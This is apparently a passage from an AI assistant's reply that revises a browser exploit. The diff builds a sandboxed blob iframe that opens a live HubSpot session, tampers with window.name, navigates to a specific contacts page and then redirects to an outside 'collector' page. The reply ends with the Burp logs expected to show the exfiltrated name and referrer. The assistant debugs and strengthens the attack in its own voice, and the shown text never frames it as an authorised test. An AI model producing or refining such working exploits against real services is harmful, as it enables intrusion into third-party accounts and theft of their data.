@@ -15,78 +15,158 @@ function log(msg) {
 
 log('relay_loaded');
 
-// Listen for start command
 window.addEventListener('message', function(e) {
     if (e.data && e.data.action === 'startExploit') {
         log('received_start_command');
         
+        // Create the sandbox HTML as a blob
+        const sandboxHTML = `
+<!DOCTYPE html>
+<html>
+<head><title>Sandbox</title></head>
+<body>
+    <h2>Sandbox Running</h2>
+    <div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
+    
+    <script>
+        const LOG_DIV = document.getElementById('log');
+        
+        function log(msg) {
+            LOG_DIV.innerHTML += '<br>' + msg;
+            console.log('[SANDBOX]', msg);
+        }
+        
+        log('1. Sandbox script started');
+        log('2. Origin: ' + window.origin);
+        
+        try {
+            log('3. Opening HubSpot...');
+            
+            const hub = window.open('https://app-eu1.hubspot.com', 'hubspot_window', 'width=1000,height=700');
+            
+            if (!hub) {
+                log('ERROR: Popup was blocked');
+            } else {
+                log('4. Popup opened successfully');
+                log('5. Window name before: ' + hub.name);
+                
+                // Wait for HubSpot to load
+                setTimeout(() => {
+                    log('6. Setting window.name...');
+                    
+                    try {
+                        hub.name = 'exploited_session_' + Date.now();
+                        log('7. Name set to: ' + hub.name);
+                    } catch(e) {
+                        log('ERROR setting name: ' + e.message);
+                    }
+                    
+                    // Navigate to HubSpot contacts
+                    setTimeout(() => {
+                        log('8. Navigating to contacts page...');
+                        
+                        try {
+                            hub.location = 'https://app-eu1.hubspot.com/contacts/146256700';
+                            log('9. Navigation command sent');
+                        } catch(e) {
+                            log('ERROR navigating: ' + e.message);
+                        }
+                        
+                        // After contacts loads, navigate to collector
+                        setTimeout(() => {
+                            log('10. Name after navigation: ' + hub.name);
+                            log('11. Navigating to collector...');
+                            
+                            try {
+                                hub.location = 'https://majdch22.github.io/collector.html';
+                                log('12. Final navigation sent');
+                            } catch(e) {
+                                log('ERROR final nav: ' + e.message);
+                            }
+                            
+                        }, 5000);
+                        
+                    }, 3000);
+                    
+                }, 3000);
+            }
+            
+        } catch(err) {
+            log('CRITICAL ERROR: ' + err.message);
+            log('Stack: ' + err.stack);
+        }
+    <\/script>
+</body>
+</html>
+        `;
+        
+        // Create blob URL
+        const blob = new Blob([sandboxHTML], {type: 'text/html'});
+        const blobURL = URL.createObjectURL(blob);
+        
+        log('blob_url_created: ' + blobURL.substring(0, 30) + '...');
+        
         // Create sandboxed iframe
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
+        iframe.src = blobURL;
+        iframe.style.cssText = 'width:100%;height:450px;border:2px solid red';
         
-        // Use srcdoc (inherits parent origin but sandbox makes it null)
-        iframe.srcdoc = `
-            <h2>Sandbox</h2>
-            <div id="log"></div>
-            <script>
-                function log(msg) {
-                    document.getElementById('log').innerHTML += '<br>' + msg;
-                }
-                
-                log('Sandbox loaded');
-                log('Origin: ' + window.origin);
-                
-                // Open HubSpot popup
-                log('Opening HubSpot...');
-                const hub = window.open('https://app-eu1.hubspot.com', 'hubspot_window');
-                
-                if (!hub) {
-                    log('ERROR: Popup blocked');
-                } else {
-                    log('Popup opened successfully');
-                    
-                    // Wait for it to load
-                    setTimeout(() => {
-                        log('Setting window.name');
-                        
-                        // Set a marker in window.name
-                        hub.name = 'exploited_' + Date.now();
-                        
-                        log('Name set to: ' + hub.name);
-                        
-                        // Navigate to contacts page
-                        log('Navigating to contacts...');
-                        hub.location = 'https://app-eu1.hubspot.com/contacts/146256700';
-                        
-                        // After navigation, window.name should persist
-                        setTimeout(() => {
-                            log('Checking name after navigation...');
-                            log('Current name: ' + hub.name);
-                            
-                            // Navigate to our collector
-                            setTimeout(() => {
-                                log('Navigating to collector');
-                                hub.location = 'https://majdch22.github.io/data-collector.html';
-                            }, 3000);
-                            
-                        }, 3000);
-                        
-                    }, 3000);
-                }
-            <\/script>
-        `;
-        
-        iframe.style.cssText = 'width:100%;height:400px;border:2px solid red';
         document.body.appendChild(iframe);
-        
-        log('sandbox_iframe_created');
+        log('sandbox_iframe_added_to_dom');
     }
 });
 
-// Tell opener we're ready
 if (window.opener) {
     window.opener.postMessage({status: 'ready'}, '*');
 }
 </script>
 </body>
 </html>
+```
+
+---
+
+## **What Changed:**
+
+1. ✅ Using **Blob URL** instead of `srcdoc`
+2. ✅ More detailed **numbered logging** (1, 2, 3...) so we can see exactly where it stops
+3. ✅ **Error handling** on every operation
+4. ✅ Logs visible **both on screen and in console**
+
+---
+
+## **Expected Burp Logs (if working):**
+```
+/?step=1
+/?step=2
+/?log=relay_loaded
+/?log=received_start_command
+/?log=blob_url_created:blob:null/...
+/?log=sandbox_iframe_added_to_dom
+```
+
+**Then you should SEE on the screen** (in the red-bordered iframe):
+```
+Sandbox Running
+1. Sandbox script started
+2. Origin: null
+3. Opening HubSpot...
+4. Popup opened successfully
+5. Window name before: hubspot_window
+6. Setting window.name...
+7. Name set to: exploited_session_...
+8. Navigating to contacts page...
+9. Navigation command sent
+10. Name after navigation: exploited_session_...
+11. Navigating to collector...
+12. Final navigation sent
+```
+
+---
+
+## **And in Burp (from collector.html):**
+```
+/?name=exploited_session_1768774XXX
+/?referrer=https://app-eu1.hubspot.com/contacts/146256700
+POST /collected
